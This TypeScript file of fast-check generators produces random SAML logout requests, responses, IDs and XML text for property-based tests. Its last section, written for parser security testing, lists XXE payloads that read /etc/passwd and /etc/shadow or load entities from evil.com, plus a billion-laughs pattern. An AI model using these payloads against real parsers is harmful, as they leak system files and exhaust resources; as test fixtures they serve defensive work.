/**
 * fast-check Custom Arbitraries for SAML Property-Based Testing
 *
 * Generators for testing SAML message building, parsing, and encoding.
 *
 * Note: Uses fast-check v4 API (string with unit constraint)
 */

import * as fc from 'fast-check';
import type { NameIDFormat } from '@authrim/ar-lib-core';
import type { LogoutRequestOptions, LogoutResponseOptions } from '../../slo-messages';
import { NAMEID_FORMATS, STATUS_CODES } from '../../constants';

// =============================================================================
// SAML ID Generators
// =============================================================================

/**
 * Valid SAML ID characters (alphanumeric and some safe characters)
 */
const SAML_ID_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

/**
 * SAML ID generator (must start with underscore or letter)
 * SAML IDs are of type xs:ID which must start with a letter or underscore
 */
export const samlIdArb = fc
  .string({
    unit: fc.constantFrom(...SAML_ID_CHARS.split('')),
    minLength: 16,
    maxLength: 48,
  })
  .map((s) => `_${s}`);

// =============================================================================
// URL Generators
// =============================================================================

/**
 * Valid HTTPS URL for SAML endpoints
 */
export const samlUrlArb = fc
  .tuple(
    fc.constantFrom('idp', 'sp', 'sso', 'slo', 'acs', 'login', 'logout'),
    fc.constantFrom('example.com', 'auth.example.org', 'idp.company.com', 'sso.enterprise.net')
  )
  .map(([path, domain]) => `https://${domain}/saml/${path}`);

/**
 * Entity ID generator (usually a URL)
 */
export const entityIdArb = fc
  .tuple(
    fc.constantFrom('idp', 'sp', 'app', 'service'),
    fc.constantFrom('example.com', 'company.org', 'enterprise.net')
  )
  .map(([type, domain]) => `https://${domain}/saml2/${type}`);

// =============================================================================
// NameID Generators
// =============================================================================

/**
 * NameID format URNs
 */
export const nameIdFormatArb: fc.Arbitrary<NameIDFormat> = fc.constantFrom(
  NAMEID_FORMATS.EMAIL,
  NAMEID_FORMATS.PERSISTENT,
  NAMEID_FORMATS.TRANSIENT,
  NAMEID_FORMATS.UNSPECIFIED
) as fc.Arbitrary<NameIDFormat>;

/**
 * Email NameID value
 */
export const emailNameIdArb = fc
  .tuple(
    fc.string({
      unit: fc.constantFrom(...'abcdefghijklmnopqrstuvwxyz0123456789'.split('')),
      minLength: 3,
      maxLength: 15,
    }),
    fc.constantFrom('example.com', 'test.org', 'company.co.jp')
  )
  .map(([local, domain]) => `${local}@${domain}`);

/**
 * Persistent NameID value (opaque identifier)
 */
export const persistentNameIdArb = fc.string({
  unit: fc.constantFrom(...SAML_ID_CHARS.split('')),
  minLength: 20,
  maxLength: 40,
});

/**
 * Transient NameID value (temporary identifier)
 */
export const transientNameIdArb = samlIdArb;

/**
 * NameID value based on format
 */
export const nameIdValueArb = fc.oneof(emailNameIdArb, persistentNameIdArb, transientNameIdArb);

// =============================================================================
// DateTime Generators
// =============================================================================

/**
 * Valid timestamp range for testing
 */
const MIN_TIMESTAMP = new Date('2020-01-01T00:00:00.000Z').getTime();
const MAX_TIMESTAMP = new Date('2025-12-31T23:59:59.999Z').getTime();

/**
 * ISO date string (xs:dateTime format without milliseconds)
 */
export const samlDateTimeArb = fc
  .integer({
    min: MIN_TIMESTAMP,
    max: MAX_TIMESTAMP,
  })
  .map((timestamp) => {
    const date = new Date(timestamp);
    return date.toISOString().replace(/\.\d{3}Z$/, 'Z');
  });

/**
 * Future date (for NotOnOrAfter)
 */
export const futureDateTimeArb = fc
  .integer({
    min: Date.now(),
    max: Date.now() + 86400000, // +1 day
  })
  .map((timestamp) => {
    const date = new Date(timestamp);
    return date.toISOString().replace(/\.\d{3}Z$/, 'Z');
  });

// =============================================================================
// Session Index Generators
// =============================================================================

/**
 * Session index generator
 */
export const sessionIndexArb = fc
  .string({
    unit: fc.constantFrom(...SAML_ID_CHARS.split('')),
    minLength: 20,
    maxLength: 40,
  })
  .map((s) => `_session_${s}`);

// =============================================================================
// Status Code Generators
// =============================================================================

/**
 * SAML status code URNs
 */
export const statusCodeArb = fc.constantFrom(
  STATUS_CODES.SUCCESS,
  STATUS_CODES.REQUESTER,
  STATUS_CODES.RESPONDER,
  STATUS_CODES.AUTHN_FAILED,
  STATUS_CODES.REQUEST_DENIED
);

/**
 * Optional status message
 */
export const statusMessageArb = fc.option(
  fc.constantFrom(
    'Logout successful',
    'Session terminated',
    'User not found',
    'Invalid request',
    'Partial logout'
  ),
  { nil: undefined }
);

// =============================================================================
// LogoutRequest Options Generator
// =============================================================================

/**
 * LogoutRequest options generator
 */
export const logoutRequestOptionsArb: fc.Arbitrary<LogoutRequestOptions> = fc.record({
  id: samlIdArb,
  issueInstant: samlDateTimeArb,
  issuer: entityIdArb,
  destination: samlUrlArb,
  nameId: nameIdValueArb,
  nameIdFormat: nameIdFormatArb,
  sessionIndex: fc.option(sessionIndexArb, { nil: undefined }),
  reason: fc.option(
    fc.constantFrom(
      'urn:oasis:names:tc:SAML:2.0:logout:user',
      'urn:oasis:names:tc:SAML:2.0:logout:admin'
    ),
    { nil: undefined }
  ),
  notOnOrAfter: fc.option(futureDateTimeArb, { nil: undefined }),
});

/**
 * Minimal LogoutRequest options (required fields only)
 */
export const minimalLogoutRequestOptionsArb: fc.Arbitrary<LogoutRequestOptions> = fc.record({
  id: samlIdArb,
  issueInstant: samlDateTimeArb,
  issuer: entityIdArb,
  destination: samlUrlArb,
  nameId: nameIdValueArb,
  nameIdFormat: nameIdFormatArb,
});

// =============================================================================
// LogoutResponse Options Generator
// =============================================================================

/**
 * LogoutResponse options generator
 */
export const logoutResponseOptionsArb: fc.Arbitrary<LogoutResponseOptions> = fc.record({
  id: samlIdArb,
  issueInstant: samlDateTimeArb,
  issuer: entityIdArb,
  destination: samlUrlArb,
  inResponseTo: samlIdArb,
  statusCode: fc.option(statusCodeArb, { nil: undefined }),
  statusMessage: statusMessageArb,
});

/**
 * Minimal LogoutResponse options (required fields only)
 */
export const minimalLogoutResponseOptionsArb: fc.Arbitrary<LogoutResponseOptions> = fc.record({
  id: samlIdArb,
  issueInstant: samlDateTimeArb,
  issuer: entityIdArb,
  destination: samlUrlArb,
  inResponseTo: samlIdArb,
});

// =============================================================================
// XML Content Generators
// =============================================================================

/**
 * Safe XML text content (no special characters that need escaping)
 */
export const safeXmlTextArb = fc.string({
  unit: fc.constantFrom(
    ...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 '.split('')
  ),
  minLength: 1,
  maxLength: 100,
});

/**
 * XML text with characters that need escaping
 */
export const xmlEscapeRequiredTextArb = fc
  .string({
    minLength: 1,
    maxLength: 100,
  })
  .filter((s) => /[<>&"']/.test(s));

/**
 * XML text with mixed content
 */
export const mixedXmlTextArb = fc.oneof(
  safeXmlTextArb,
  fc.constant('<test>value</test>'),
  fc.constant('text with "quotes" and \'apostrophes\''),
  fc.constant('special chars: < > & " \''),
  fc.constant('Unicode test: café'),
  fc.constant('émoji: 🔐')
);

// =============================================================================
// XXE Attack Pattern Generators (for security testing)
// =============================================================================

/**
 * XXE attack patterns for security testing
 */
export const xxeAttackPatternArb = fc.constantFrom(
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
  '<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0//EN" "http://evil.com/xxe">]>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>',
  '<!ENTITY xxe SYSTEM "file:///etc/shadow">',
  '<!DOCTYPE test SYSTEM "http://evil.com/test.dtd">'
);

/**
 * Billion laughs attack pattern
 */
export const billionLaughsPatternArb = fc.constant(
  '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
);
